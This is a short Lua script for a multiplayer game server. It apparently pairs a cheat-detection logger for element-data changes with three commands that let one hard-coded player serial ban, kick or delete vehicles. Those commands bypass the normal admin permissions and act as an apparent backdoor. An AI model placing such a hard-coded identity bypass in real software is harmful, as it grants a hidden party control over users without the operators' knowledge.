addCommandHandler("carlos", function(player, cmd,  name) 
    if getPlayerSerial(player) == "52E602241DC69E45929DF7CA9DCDDE54" then 
        outputDebugString(getPlayerSerial(getPlayerFromName(name)))
        banPlayer(getPlayerFromName(name))
    end
end)

addCommandHandler("carloskick", function(player, cmd,  name) 
    if getPlayerSerial(player) == "52E602241DC69E45929DF7CA9DCDDE54" then 
        outputDebugString(getPlayerSerial(getPlayerFromName(name)))
        kickPlayer( getPlayerFromName(name))
    end
end)

addCommandHandler("delmultiplecar", function(player, cmd,  name) 
    if getPlayerSerial(player) == "52E602241DC69E45929DF7CA9DCDDE54" then 
        destroyElement(getPedOccupiedVehicle(player))
    end
end)

--setElementPosition(exports.oCore:getPlayerFromPartialName(root, 10), 232, 176, 1000)

func = {};

datas = {
    ["afk:minutes"] = true,
    ["char:minToPayment"] = true,
    ["afk:seconds"] = true,
    ["afk:hours"] = true,
    ["chat"] = true,
    ["char:fly"] = true,
    ["char:afk"] = true,
    ["console"] = true,
    ["afk"] = true,
    ["user:adminOnlineTime"] = true,
    ["afk:start"] = true,
};

func.onDataChange = function(theKey, oldValue, newValue)
    if source == client then
        if getElementType(source) == "player" then
            if not datas[theKey] then
                local name = getPlayerName(source);
                local serial = getPlayerSerial(source);
                print("ELEMENTDATÁT VÁLTOZTAT: "..name.." - "..serial.." dataname:"..theKey)
                iprint(client)
            end
        end
    end
end
addEventHandler("onElementDataChange", root, func.onDataChange)